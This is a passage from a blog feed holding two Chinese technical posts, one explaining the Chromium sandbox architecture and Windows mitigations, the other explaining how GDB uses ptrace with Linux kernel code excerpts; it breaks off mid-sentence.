        <content type="html"><![CDATA[<h1 id="Chromium"><a href="#Chromium" class="headerlink" title="Chromium"></a>Chromium</h1><p>Chromium 主要包含两大核心组成部分：渲染引擎和浏览器内核。</p><p>Chromium 目前使用 Blink 作为渲染引擎，它是基于 webkit 定制而来的，核心逻辑位于项目仓库的<code>third_party/blink/</code>目录下。渲染引擎做的事情主要有：</p><ul><li>解析并构建 DOM 树。Blink 引擎会把 DOM 树转化成 C++ 表示的结构，以供 V8 操作</li><li>调用 V8 引擎处理 JavaScript 和 Web Assembly 代码，并对 HTML 文档做特定操作</li><li>处理 HTML 文档定义的 CSS 样式</li><li>调用 Chrome Compositor，将 HTML 对应的元素绘制出来。这个阶段会调用 OpenGL，未来还会支持 Vulkan。在 Windows 平台上，该阶段还会调用 DirectX 库处理；在处理过程中，OpenGL还会调用到 Skia，DirectX 还会调用到 ANGLE</li></ul><p>Blink组件间的调用先后关系，几乎所有发生在浏览器页签中的工作，都有Blink参与处理。可用下图概括：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/image-20210722105345920.png" alt="image-20210722105345920"></p><p>浏览器内核扮演连接渲染引擎及系统的“中间人”角色，具有一定“特权”，负责处理的事务包括但不限于：</p><ul><li>管理收藏夹、cookies以及保存的密码等重要用户信息</li><li>负责处理网络通讯相关的事务</li><li>在渲染引擎和系统间起中间人的角色。渲染引擎通过Mojo与浏览器内核交互，包含组件：download、payments等等。</li></ul><p>Chromium渲染引擎涉及大量C++编写的组件，出现漏洞的概率不小。因此，基于纵深防御理念浏览器引入了沙箱机制。渲染引擎等组件不直接与系统交互，而是通过一个被称为 MOJO 的 IPC 组件与浏览器引擎通讯（也被称为 broker），再与系统交互。进而可以实现：即便沙箱中的进程被攻破，但无法随意调用系统API产生更大的危害。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210722112150.png" alt="image-20210722112145132"></p><h1 id="Sandbox"><a href="#Sandbox" class="headerlink" title="Sandbox"></a>Sandbox</h1><ul><li><p>沙箱是一个 C++ library，沙箱进程便是通过该<code>C++ library</code>所创建，为了确保安全性，沙箱进程所处的执行环境是非常受限的。</p></li><li><p>沙盒进程可以自由使用的唯一资源是 CPU 周期和内存。例如，沙箱进程不能向磁盘写数据或显示它们自己的窗口。</p></li><li><p>Chromium renderers 便是一个沙盒进程。沙箱的目标是提供关于一段代码最终能做什么或不能做什么的硬保证。</p></li><li><p>沙箱限制了在沙箱内运行代码的 bug 的影响性，例如：这种bug不能在用户帐户中安装持久性恶意软件（因为沙箱禁止写入文件系统）也不能从计算机本地当中读取任何文件。但是沙箱不能够对系统组件提供保护（如运行它的内核）</p></li><li><p>沙箱无法针对系统组件（例如运行它的内核）中的错误提供任何保护。</p></li><li><p>沙箱在运行初始时并不是完全状态，只有当进程调用<code>LowerToken()</code>方法后，沙箱才会完全生效。这样的设置，使得沙箱进程在启动这段时间内，可以自由的获取关键资源，加载 library，读取配置文件。所以，当进程开始和不受信任的文件交互之前，应尽快调用 <code>LowerToken()</code>。</p><p>  Note：如果进程被感染，在调用<code>LowerToken()</code>后，打开的操作系统句柄都可能会被恶意软件滥用。</p><blockquote><p>浏览器渲染引擎、GPU、PPAPI插件以及语音识别服务等进程是运行在沙箱中的。此外不同系统平台下的部分服务也会受沙箱保护，例如Windows下打印时调用的PDF转换服务、icon浏览服务；MacOS下NaCl loader、需要访问IOSurface的镜像服务等。</p></blockquote></li></ul><h1 id="Windows-Sandbox-架构"><a href="#Windows-Sandbox-架构" class="headerlink" title="Windows Sandbox 架构"></a>Windows Sandbox 架构</h1><ul><li>Windows sandbox 是仅限于 <strong>user-mode</strong>的沙箱，也没有特殊的内核模式驱动程序，因此用户不需要成为管理员，以确保 Sandbox 的正常运行。</li><li>Sandbox 有 32 位和 64 位两种，在所有的 Win7 和 Win10 均已经被测试</li><li>Sandbox 在进程级粒度进行运作，任何需要沙箱化的目标，都需要其是独立进程。最简单的沙箱配置需要两个进程：一个是被称为 broker 的 privileged controller，以及被称为 target 的一个或多个沙箱化进程。</li><li>Sandbox 作为静态库提供，必须链接到 broker 和目标可执行文件。</li></ul><h2 id="The-broker-process"><a href="#The-broker-process" class="headerlink" title="The broker process"></a>The broker process</h2><p>在 chromium 中，broker就是浏览器的主进程。宽泛的说，borker 是权限控制器 / sandbox进程活动的管理员。其职责是：</p><ul><li>指定每个目标进程中的策略</li><li>生成目标进程</li><li>维护沙箱策略引擎服务</li><li>维护沙箱拦截管理器</li><li>维护沙箱IPC服务（与target进程的通信）</li></ul><p>broker 的存活时间总是比他生成的目标进程要长，Sandbox IPC是一种用于将某些 Windows API 调用从 target 转发到 broker 的低级机制(不同于Chromium的IPC)，这些 API 根据策略而定。策略允许的 API 则由 borker 进行调用，结果会通过同样的IPC返回给目标进程。 Interceptions manager 的工作给应该通过 IPC 转发给 broker 的Windows API调用提供补丁。</p><h2 id="The-target-process"><a href="#The-target-process" class="headerlink" title="The target process"></a>The target process</h2><p>在 chromium 中，target process 就是 renderers，除非执行了 <code>--no-sandbox</code>命令。target 进程维护所有将在沙箱中运行的代码，以及沙箱 client 方面的基础架构：</p><ul><li>对所有代码进行沙箱化</li><li>沙箱化 IPC client</li><li>沙箱策略引擎客户端</li><li>沙箱拦截</li></ul><blockquote><p>2、3、4 是 sandbox library 的一部分，需要和被沙箱化的代码一同链接</p></blockquote><p>Interceptions(hooks)是 Windows API 调用通过沙箱 IPC 转发到 broker 的方式。The interceptions (also known as hooks) are how Windows API calls are forwarded via the sandbox IPC to the broker.</p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210720190130.png" style="zoom:50%;" /><h2 id="Sandbox-restrictions"><a href="#Sandbox-restrictions" class="headerlink" title="Sandbox restrictions"></a>Sandbox restrictions</h2><p>沙盒依赖于 Windows 提供的四种保护机制：</p><ul><li><p>A restricted token</p></li><li><p>The Windows <em>job</em> object</p></li><li><p>The Windows <em>desktop</em> object</p></li><li><p>Integrity levels</p></li></ul><p>这些机制在保护操作系统，操作系统的限制，用户提供的数据上相当的高效，前提是：</p><ul><li>所有可以安全化的资源都有一个比null更好的安全描述符。换言之，没有关键资源会有错误的安全配置。</li><li>电脑还没有被恶意软件破坏。</li><li>第三方软件不会降低系统的安全性。</li></ul><h3 id="The-token"><a href="#The-token" class="headerlink" title="The token"></a>The token</h3><p>对于 Chromium Sandbox 最严格的 token 采用以下形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Regular Groups</span><br><span class="line">Logon SID : mandatory</span><br><span class="line">All other SIDs : deny only, mandatory</span><br><span class="line">Restricted Groups</span><br><span class="line">S-1-0-0 : mandatory</span><br><span class="line">Privileges</span><br><span class="line">None</span><br><span class="line">Integrity</span><br><span class="line">Untrusted integrity level label (S-1-16-0x0)</span><br></pre></td></tr></table></figure><p>Chromium 的渲染器以某个 token 运行，意味着渲染器进程使用的几乎所有资源都已被浏览器获取，它们的句柄也将被复制到渲染器的进程中。</p><p><strong>NOTE</strong>：token 不是派生于anonymous or guest 的 token，它继承于 user’s token 与用户的登录相关联。因此，系统或域中已有的任何审计仍然可以使用。</p><p>根据设计，沙箱 token 不能保护下面这些不安全资源：</p><ul><li>挂载的FAT或FAT32卷: 它们的安全描述符是 NULL。在 target 中运行的恶意软件可以读写这些磁盘空间。</li><li>TCP/IP: Windows 200和Windows XP（但在Vista中不会）中的TCP/IP socket的安全性实际上是无效的。target 中的恶意代码可能会向任何主机发送和接收网络数据包。</li><li>一些未标记的 objects，例如匿名共享内存 (e.g. <a href="https://crbug.com/338538">bug 338538</a>)</li></ul><h3 id="The-Job-object"><a href="#The-Job-object" class="headerlink" title="The Job object"></a>The Job object</h3><p>target 进程也运行于 object 之下，使用这个 Windows 机制，一些没有传统对象或安全描述符的的全局限制被强制执行:</p><ul><li>禁止用SystemParametersInfo()做用户共享的系统范围的修改，这可以用于切换鼠标按钮或者设置屏幕保护程序超时</li><li>禁止创建或修改桌面对象</li><li>禁止修改用户共享的显示设置，比如分辨率和主显示器</li><li>禁止读写剪贴板</li><li>禁止设置全局Windows hook（使用SetWindowsHookEx()）</li><li>禁止访问全局原子表</li><li>禁止访问在作业对象外创建的USER句柄</li><li>单活跃的进程限制（不允许创建子进程）</li></ul><p>Chromium 渲染器通常在这些限制全部都开启后运行。每个渲染器运行在其自己的 Job object 里。</p><h3 id="The-alternate-desktop"><a href="#The-alternate-desktop" class="headerlink" title="The alternate desktop"></a>The alternate desktop</h3><p>token 和 job object 规定了一个安全边界。</p><ul><li>只要进程的 token 相同且处于同一 job object 下，那么他们同处于同一个安全的上下文环境中。</li><li>在同一桌面下具有有窗口的应用程序也处于同一个安全的上下文环境中。因为发送和接收窗口消息不受任何安全检查的约束。</li></ul><p>在标准Windows安装中，至少有两个桌面和交互式窗口站相关联：常规（默认）桌面和登录桌面。Sandbox创建了与所有目标进程关联的第三个桌面。此桌面不可见也不能交互，并且有效地隔离沙箱化进程，使其不能窥探用户的交互，不能在更多特权的环境下发送消息到Windows。</p><p>唯一的缺点是会使用4MB 的 RAM，Vista下可能会更多。</p><h3 id="The-integrity-levels"><a href="#The-integrity-levels" class="headerlink" title="The integrity levels"></a>The integrity levels</h3><ul><li><p>Integrity 级别是由一组特殊的 SID 和 ACL 条目实现的，它们代表五个不断增加的特权级别：untrusted, low, medium, high, system</p></li><li><p>如果一个对象处于比请求者更高级的信用等级，访问该对象就会受限。</p></li><li><p>Integrity 级别还实现了用户界面权限隔离，Integrity 性级别的规则应用于在同一桌面下的不同进程之间交换窗口消息</p></li><li><p>token 可以向更高 level 的 object 读数据，但是不能写数据。</p></li><li><p>大多数桌面应用程序以 medium integrity (MI)信任等级运行，信任度较低的程序(保护模式下的 IE 和 GPU 的 Sandbox)以 low integrity (LI) 信任等级运行，而 renderer 则以最低的信任等级运行。</p></li></ul><p>一个低 level 的 token 只能访问以下资源：</p><ul><li>从大部分的文件里读取数据</li><li>可以向 <code>%USER PROFILE%\AppData\LocalLow</code> 写数据</li><li>读注册表的大部分内容</li><li>可以向 <code>HKEY_CURRENT_USER\Software\AppDataLow</code>写数据</li><li>剪贴板(为某些格式做复制粘贴)</li><li>远程过程调用（RPC）</li><li>TCP/IP Socket</li><li>通过ChangeWindowMessageFilter暴露窗口消息</li><li>通过LI标签共享内存</li><li>拥有LI启动激活的权限，访问COM接口</li><li>通过LI标签暴露的命名管道</li></ul><h3 id="Process-mitigation-policies"><a href="#Process-mitigation-policies" class="headerlink" title="Process mitigation policies"></a>Process mitigation policies</h3><p>沙箱通过 <code>SetProcessMitigationPolicy</code> 方法来给 target 进程设置保护措施，以强化安全特性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">Data Execution Prevention：</span><br><span class="line">数据执行保护，是一组在存储器上运行额外检查的硬件和软件技术，有助于防止恶意程序码在系统上运行。和 LINUX 下的 NX 保护比较类似，堆栈只有读写权限，没有执行权限，主要用途是限制以写 shellcode 为主的攻击手段。</span><br><span class="line"></span><br><span class="line">Relocate Images:</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">在进程中对所有图片做随机地址加载(ASLR)（必须被所有图片支持）</span><br><span class="line"></span><br><span class="line">Heap Terminate:</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">结束Windows堆占用进程</span><br><span class="line"></span><br><span class="line">Bottom-up ASLR:</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">地址随机化</span><br><span class="line"></span><br><span class="line">High-entropy ASLR:</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">为自底向上ASLR增加随机等级到1TB</span><br><span class="line"></span><br><span class="line">Strict Handle Checks:</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">对于恶意句柄引用立即抛出异常</span><br><span class="line"></span><br><span class="line">Win32k.sys lockdown:</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">ProcessSystemCallDisablePolicy 允许从目标过程中选择性禁用系统调用</span><br><span class="line">渲染器进程现在将此设置为DisallowWin32kSystemCalls，这意味着不再允许来自win32k.sys服务的用户模式的调用。这大大减少了渲染器提供的内核攻击面。</span><br><span class="line"></span><br><span class="line">App Container (low box token):</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">在Windows里，这由内核层的一个Low Box Token实现，它是有着限制优先权（通常只有SeChangeNotifyPrivilege和 SeIncreaseWorkingSetPrivilege）的一个剥离版本，运行在低信用等级，这个容器还由一组“能力”实现，它们可以映射到进程允许&#x2F;拒绝做的事情（查看MSDN获取更详细的描述）。从沙箱角度看，最有趣的能力是否决是对网络的访问，如果令牌是Low Box Token，INTERNET_CLIENT能力没有出现的话，就会执行网络检查。</span><br><span class="line">因此沙箱对已有的限制令牌，添加了Low Box相关的属性，并且不授予任何能力，以获得没有来自沙箱化进程的网络访问这样的额外的网络保护。</span><br><span class="line"></span><br><span class="line">Disable Extension Points (legacy hooking):</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">ProcessExtensionPointDisablePolicy</span><br><span class="line">以下注入向量被阻断:</span><br><span class="line">AppInit DLLs Winsock Layered Service Providers (LSPs)</span><br><span class="line">Global Window Hooks (not thread-targeted hooks)</span><br><span class="line">Legacy Input Method Editors (IMEs)</span><br><span class="line"></span><br><span class="line">Control Flow Guard (CFG):</span><br><span class="line">&gt;&#x3D; Win8.1 Update 3 (KB3000850)</span><br><span class="line">CFG通过在编译和链接期间，记录下所有的间接调用信息，并把他们记录在最终的可执行文件中，并且在所有的间接调用之前插入额外的校验，当间接调用的地址被篡改时，会触发一个异常，操作系统介入处理。</span><br><span class="line"></span><br><span class="line">CET Shadow Stack:</span><br><span class="line">Available in Windows 10 2004 December Update.</span><br><span class="line">未在渲染器中启用.</span><br><span class="line"></span><br><span class="line">Disable Font Loading:</span><br><span class="line">&gt;&#x3D; Win10</span><br><span class="line">ProcessFontDisablePolicy</span><br><span class="line"></span><br><span class="line">Disable Loading of Unsigned Code (CIG):</span><br><span class="line">&gt;&#x3D; Win10 TH2</span><br><span class="line">ProcessSignaturePolicy</span><br><span class="line">防止将未签名代码加载到进程中。这意味着攻击者不能在获得执行权限后加载一个DLL库（其他沙盒缓解措施会起到作用），更重要的是，可以防止第三方DLL注入到我们的进程中，这会影响稳定性和我们启用其他安全缓解措施的能力</span><br><span class="line">为所有沙盒子进程启用.</span><br><span class="line">为沙盒渲染器进程启用（预启动）。这消除了一个进程启动时间间隔，在该时间间隔内，可能会将不正确签名的dll本地注入到呈现程序进程中。</span><br><span class="line"></span><br><span class="line">Disable Image Load from Remote Devices:</span><br><span class="line">&gt;&#x3D; Win10 TH2</span><br><span class="line">ProcessImageLoadPolicy</span><br><span class="line">E.g. UNC path to network resource.</span><br><span class="line"></span><br><span class="line">Disable Image Load of “mandatory low” (low integrity level):</span><br><span class="line">&gt;&#x3D; Win10 TH2</span><br><span class="line">ProcessImageLoadPolicy</span><br><span class="line">E.g. temporary internet files.</span><br><span class="line"></span><br><span class="line">Extra Disable Child Process Creation:</span><br><span class="line">&gt;&#x3D; Win10 TH2</span><br><span class="line">If the Job level &lt;&#x3D; JOB_LIMITED_USER, set PROC_THREAD_ATTRIBUTE_CHILD_PROCESS_POLICY to PROCESS_CREATION_CHILD_PROCESS_RESTRICTED via UpdateProcThreadAttribute().</span><br><span class="line">额外的防御层。提供 job level 可以屏蔽该防御</span><br></pre></td></tr></table></figure><h2 id="Sandbox-policy"><a href="#Sandbox-policy" class="headerlink" title="Sandbox policy"></a>Sandbox policy</h2><p>target 进程的实际限制由 Sandbox policy 进行配置。Sandbox policy 只是一个编程接口，borker 调用它来定义限制和允许。四个功能控制限制，大致对应四个Windows机制：</p><ul><li><code>TargetPolicy::SetTokenLevel()</code></li><li><code>TargetPolicy::SetJobLevel()</code></li><li><code>TargetPolicy::SetIntegrityLevel()</code></li><li><code>TargetPolicy::SetDesktop()</code></li></ul><p>前三个调用使用一个整数级别的参数，该参数从非常strict 到 非常 loose。例如，token 有 7 个 level、job 有 5 个 level，Chromium渲染器通常以四种机制中最严格的级别运行。最后一个（桌面）策略是二进制的，只能用于检测目标是否在备用桌面上运行。</p><h2 id="Target-bootstrapping"><a href="#Target-bootstrapping" class="headerlink" title="Target bootstrapping"></a>Target bootstrapping</h2><p>target 不伴随着限定策略一同执行，它们从一个和常规用户进程 token 非常相似的token开始执行。因为在进程引导过程中，操作系统加载程序需要访问大量资源，其中大部分是未认证且随时会变化的。另外，大部分应用程序使用标准开发工具提供的标准CRT，在进程得到引导后，CRT也需要初始化，这时CRT初始化的内部再次变成未认证状态了。</p><p>在引导阶段，进程实际上使用了两种令牌(token)：</p><ul><li><p>锁定令牌(lockdown token)，即进程令牌</p></li><li><p>初始令牌(initial token)，即设置为初始线程的模拟令牌</p></li></ul><p>事实上，真正的SetTokenLevel定义是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetTokenLevel(TokenLevel initial, TokenLevel lockdown)</span><br></pre></td></tr></table></figure><p>在所有的初始化操作完成后，main()或WinMain()会继续执行，还有两个令牌会存活，但只有初始线程可以使用更强大的那个初始令牌。target的责任是在准备完成后销毁初始令牌。通过调用下面函数实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LowerToken()</span><br></pre></td></tr></table></figure><p>调用完<code>LowerToken()</code>后，target 唯一可用的 token 便是 lockdown token，并且在此之后完整的沙箱限制开始生效。该调用不可撤销。注意，初始令牌是模拟令牌仅对主线程有效，target 进程中创建的其他线程仅使用锁定令牌，因此不会尝试获取符合安全检查的任何系统资源。</p><p>target 始于特权令牌，这简化了explicit policy，因为任何需要在进程启动时执行一次的特权操作都可以在<code>LowerToken()</code>调用之前完成，并且不需要在策略中包含规则。</p><p><strong>NOTE</strong></p><p>确保在调用 <code>LowerToken()</code> 之前关闭使用初始令牌获得的任何敏感操作系统句柄。任何泄露的句柄都可能被恶意软件滥用以逃离沙箱。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/design/sandbox_faq.md">https://chromium.googlesource.com/chromium/src/+/HEAD/docs/design/sandbox_faq.md</a></p><p><a href="https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/design/sandbox.md">https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/design/sandbox.md</a></p><p><a href="https://blog.csdn.net/u011453773/article/details/51162334?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-1&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/u011453773/article/details/51162334?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-1&amp;spm=1001.2101.3001.4242</a></p>]]></content>
      
      
      <categories>
          
          <category> Chromium </category>
          
          <category> Sandbox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sandbox </tag>
            
            <tag> Chromium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>调试原理小计</title>
      <link href="posts/97908563/"/>
      <url>posts/97908563/</url>
      
        <content type="html"><![CDATA[<h1 id="GDB原理"><a href="#GDB原理" class="headerlink" title="GDB原理"></a>GDB原理</h1><h2 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>linux下gdb调试都是通过ptrace来实现的，通过名字我们就可以看到ptrace是一个用于进程追踪的系统调用，当进程调用了 ptrace 跟踪某个进程之后:</p><ul><li>被跟踪进程的进程状态被标记为 <code>TASK_STOPED</code></li><li>发送给被跟踪子进程的信号 (SIGKILL 除外) 会被转发给父进程, 而子进程会被阻塞</li><li>父进程收到信号后, 可以对子进程进行检查和修改, 然后让子进程继续执行</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="keyword">pid_t</span> pid, <span class="keyword">void</span> *addr, <span class="keyword">void</span> *data)</span></span>;</span><br></pre></td></tr></table></figure><p>其中 <code>request</code> 参数指定了我们要使用 ptrace 的什么功能, 大致可以分为以下几类:</p><ul><li>PTRACE_ATTACH 或 PTRACE_TRACEME 建立进程间的跟踪关系;<ul><li>PTRACE_TRACEME 是被跟踪子进程调用的, 表示让父进程来跟踪自己, 通常是通过 GDB 启动新进程的时候使用;</li><li>PTRACE_ATTACH 是父进程调用 attach 到已经运行的子进程中; 这个命令会有权限的检查, non-root 的进程不能 attach 到 root 进程中;</li></ul></li><li>PTRACE_PEEKTEXT, PTRACE_PEEKDATA, PTRACE_PEEKUSR 等读取子进程内存/寄存器中保留的值;</li><li>PTRACE_POKETEXT, PTRACE_POKEDATA, PTRACE_POKEUSR 等修改被跟踪进程的内存/寄存器;</li><li>PTRACE_CONT，PTRACE_SYSCALL, PTRACE_SINGLESTEP 控制被跟踪进程以何种方式继续运行;<ul><li>PTRACE_SYSCALL 会让被调用进程在每次 进入/退出 系统调用时都触发一次 SIGTRAP; strace 就是通过调用它来实现的, 在每次进入系统调用的时候读取出系统调用参数, 在退出系统调用的时候读取出返回值;</li><li>PTRACE_SINGLESTEP 会在每执行完一条指令后都触发一次 SIGTRAP; GDB 的 nexti, next 命令都是通过它来实现的;</li></ul></li><li>PTRACE_DETACH, PTRACE_KILL 脱离进程间的跟踪关系;<ul><li>当父进程在子进程之前结束时, trace 关系会被自动解除;</li></ul></li></ul><p>参数 pid 表示的是要跟踪进程的 pid, addr 表示要监控的被跟踪子进程的地址.</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>调用 <code>ptrace()</code> 系统函数时会触发调用内核的 <code>sys_ptrace()</code> 函数，由于不同的 CPU 架构有着不同的调试方式，所以 Linux 为每种不同的 CPU 架构实现了不同的 <code>sys_ptrace()</code> 函数，而本文主要介绍的是 <code>X86 CPU</code> 的调试方式，所以 <code>sys_ptrace()</code> 函数所在文件是 <code>linux-2.4.16/arch/i386/kernel/ptrace.c</code>。</p><p><code>sys_ptrace()</code> 函数的主体是一个 <code>switch</code> 语句，会传入的 <code>request</code> 参数不同进行不同的操作，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">int</span> <span class="title">sys_ptrace</span><span class="params">(<span class="keyword">long</span> request, <span class="keyword">long</span> pid, <span class="keyword">long</span> addr, <span class="keyword">long</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">child</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user</span> *<span class="title">dummy</span> = <span class="title">NULL</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i, ret;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    read_lock(&amp;tasklist_lock);</span><br><span class="line">    child = find_task_by_pid(pid); <span class="comment">// 获取 pid 对应的进程 task_struct 对象</span></span><br><span class="line">    <span class="keyword">if</span> (child)</span><br><span class="line">        get_task_struct(child);</span><br><span class="line">    read_unlock(&amp;tasklist_lock);</span><br><span class="line">    <span class="keyword">if</span> (!child)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (request == PTRACE_ATTACH) &#123;</span><br><span class="line">        ret = ptrace_attach(child);</span><br><span class="line">        <span class="keyword">goto</span> out_tsk;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (request) &#123;</span><br><span class="line">    <span class="keyword">case</span> PTRACE_PEEKTEXT:</span><br><span class="line">    <span class="keyword">case</span> PTRACE_PEEKDATA:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_PEEKUSR:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_POKETEXT:</span><br><span class="line">    <span class="keyword">case</span> PTRACE_POKEDATA:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_POKEUSR:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_SYSCALL:</span><br><span class="line">    <span class="keyword">case</span> PTRACE_CONT:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_KILL: </span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_SINGLESTEP:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_DETACH:</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">out_tsk:</span><br><span class="line">    free_task_struct(child);</span><br><span class="line">out:</span><br><span class="line">    unlock_kernel();</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以被追踪模式（PTRACE_TRACEME）为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">int</span> <span class="title">sys_ptrace</span><span class="params">(<span class="keyword">long</span> request, <span class="keyword">long</span> pid, <span class="keyword">long</span> addr, <span class="keyword">long</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (request == PTRACE_TRACEME) &#123;</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;ptrace &amp; PT_PTRACED)</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        current-&gt;ptrace |= PT_PTRACED; <span class="comment">// 标志 PTRACE 状态</span></span><br><span class="line">        ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ptrace()</code> 对 <code>PTRACE_TRACEME</code> 的处理就是把当前进程标志为 <code>PTRACE</code> 